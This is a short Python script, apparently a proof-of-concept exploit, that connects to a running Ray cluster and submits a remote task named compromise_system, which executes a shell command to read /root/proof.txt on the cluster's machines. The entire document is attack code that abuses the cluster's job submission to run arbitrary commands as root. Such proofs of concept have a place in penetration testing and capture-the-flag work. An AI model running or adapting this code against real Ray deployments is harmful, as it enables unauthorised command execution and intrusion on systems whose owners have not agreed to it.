import ray
import os

@ray.remote
def compromise_system():
    os.system('cat /root/proof.txt')

# Automatically connect to the running Ray cluster.
ray.init()
print(ray.get(compromise_system.remote()))

